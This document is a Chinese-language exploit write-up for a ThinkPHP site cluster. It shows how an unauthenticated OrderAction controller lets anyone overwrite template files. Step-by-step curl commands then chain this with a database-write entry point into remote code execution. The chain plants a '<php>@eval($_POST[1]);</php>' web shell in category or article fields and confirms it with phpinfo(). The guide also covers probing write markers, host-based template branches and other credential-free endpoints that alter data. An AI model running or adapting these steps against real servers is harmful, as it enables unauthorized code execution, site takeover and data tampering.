## 原理

该站群的 Home 组控制器里，`OrderAction` 不继承 `CommonAction` 而直接 `extends Action`：

```php
class OrderAction extends Action{          // ← 不继承 CommonAction ⇒ Home 组鉴权整体跳过
    public function get_html1(){
        $url  = "http://<自身admin域名>/List/index/type/0";
        $url1 = "http://<自身admin域名>/List/index/type/1";
        $content  = file_get_contents($url);
        $content1 = file_get_contents($url1);
        $file_path_1 = "./App/Tpl/Home/Index_example.com";     // ← 覆盖模板文件
        $file_path_2 = "./App/Tpl/Home/Index_indexapp.html";
        if(strlen($content) > 100){
            file_put_contents($file_path_1,$content);
            file_put_contents($file_path_2,$content1);
        }
        $urlapp = "http://baexample".rand(11111,99999)."ht.<admin域名>/List/getapp_html/type/1";
        $content1222 = file_get_contents($urlapp);
        ...
        file_put_contents("./Upload/atop/jquery3_6.txt",$innerHTML);
        file_put_contents("./Upload/atop/jquery3_5.txt",$content122);
        file_put_contents("./Upload/atop/attime3_5.txt",time());   // ← 天然写入探针
    }
    public function all_lock(){                       // 同样零凭证
        M("article")->where(array("status"=>1,'lock'=>0))->setField(array('lock'=>1));
        $this->get_html1();
    }
}
```

零凭证调用它会把**本站自身的 List/index 渲染结果**覆盖写入 **ThinkPHP 模板文件** `App/Tpl/Home/Index_example.com`。模板会在下次渲染时被重新编译成 PHP 缓存并执行 ⇒ **只要该渲染结果里出现 `<php>…</php>`、`{:func()}` 或 `{$a}` 形式的模板标签，即为模板注入 RCE**；而模板数据源（`cat.description/cont/you/me/form_url`、`article.title`）在模板里全部带 `|htmlspecialchars_decode` 输出，入库时 `htmlspecialchars` 转义的 `&lt;php&gt;` 会被**还原**成 `<php>` —— 只要有一个写库入口（`Admin/Article/editcat`、`Admin/Article/edit`，或零凭证的 `Home/Article/edit_cont`）就能闭合整条链。

## 利用步骤

```bash
# 0) 基线记录写入探针（该动作自己写的 time() 值）
curl -k -s --noproxy '*' "https://TARGET/Upload/atop/attime3_5.txt"

# 1) 零凭证触发覆盖（无需任何 Cookie）
curl -k -s --noproxy '*' "https://TARGET/example.com?g=Home&m=Order&a=get_html1"
#    → 200/47B {"ok":1,"msg":"成功请刷新"}

# 2) 复读探针，时间戳变化 = 真写入
curl -k -s --noproxy '*' "https://TARGET/Upload/atop/attime3_5.txt"

# 3) 确认写入的内容（311KB 级完整 HTML）= 本站 List/index 渲染输出
curl -k -s --noproxy '*' -o jq35.html "https://TARGET/Upload/atop/jquery3_5.txt"
curl -k -s --noproxy '*' -o own.html  "https://TARGET/example.com?g=Home&m=List&a=getapp_html&type=1"
wc -c jq35.html own.html        # 两者字节数应完全一致 ⇒ 抓取源是本站自身

# 4) 验证模板确实被覆盖且被渲染（关键：按 Host 选模板分支）
curl -k -s --noproxy '*' -o /dev/null -w '%{size_download}\n' "https://TARGET/"                 # 710B   → indexalert 防封页
curl -k -s --noproxy '*' -o /dev/null -w '%{size_download}\n' "https://zsm1girvry.<域名>/"     # 341485B → display("index") 渲染被覆盖的模板
curl -k -s --noproxy '*' -o /dev/null -w '%{size_download}\n' "https://spzsm1girvry.<域名>/"   # 341486B → indexapp 分支
#    IndexAction::index 分支：Host 含 "sp" → indexapp；含 "example" → indexalert；否则 → index

# 5) 模板原文直读确认（该站群 /App/Tpl/**.html 被 nginx 静态直出）
curl -k -s --noproxy '*' -o tpl.html "https://TARGET/App/Tpl/Home/Index_example.com"   # 341056B
diff <(head -c 2000 tpl.html) <(head -c 2000 jq35.html)   # 基本一致

# 6) 闭合 RCE（需任一个写库入口）—— 把模板标签写进 cat.description 或 article.title
#    cat.description 在 List_example.com 里以 {$ymgx['description']|htmlspecialchars_decode} 输出
#    article.title   以 {$id3['title']|htmlspecialchars_decode} / {$id6['title']} 输出
#    写 cat（需后台会话）：POST /example.com?g=Admin&m=Article&a=editcat
#        cid=<ymgx记录id>&description=<php>@eval($_POST[1]);</php>&cont=1&stop=0&sort=1&name=x&ename=ymgx
#    写 article（旧版零凭证入口，若该站未拦 Home/Article）：POST /example.com?g=Home&m=Article&a=edit_cont
#        cid=<分类id>&title=<php>@eval($_POST[1]);</php>&cont=1&cont1=1&description=1
#    ⇒ 再跑一次第 1 步 get_html1 覆盖模板，然后访问 zsm* 域名首页触发编译
curl -k -s --noproxy '*' "https://zsm1girvry.<域名>/" ; # 之后 POST 1=phpinfo(); 验证 RCE
```

## 前置条件 / 卡点
- **抓取 URL 硬编码为本站自身的 admin 域名**（Host 白名单域名），因此**内容源不可由攻击者控制**；利用前提是"渲染结果里已有可控数据"⇒ 必须配合一个写库入口。
- `strlen($content) > 100` 才写；抓取失败（DNS/超时）时 `$content=false`，不覆盖。
- 目标需已存在 `App/Tpl/Home/` 目录且 PHP 进程对其可写 —— 该站群实测可写。
- **若防守方把 `Home/Article` 整模块用 nginx/应用层拦掉（返回 `200 "502"`），零凭证写库入口即失效，只剩需会话的 `Admin/Article/editcat|edit`**。此时本条原语单独存在不构成 RCE，需与"后台会话"组合。

## 旁路情报（顺手可得）
- `/App/Tpl/**.html` 被 nginx 静态直出 ⇒ 后台整站模板源码 + 完整控制器/动作清单零凭证可读（`Admin/Public_left.html` 就是后台菜单；各 `Admin/Xxx_add/edit*.html` 直接给出写操作表单字段名）。
- 同一站群 `Home/Order/all_lock` 也是零凭证（`extends Action`），会 `setField(lock=1)` 改 article 表，并顺带调用 `get_html1` —— **只读验证时不要触发它改数据**。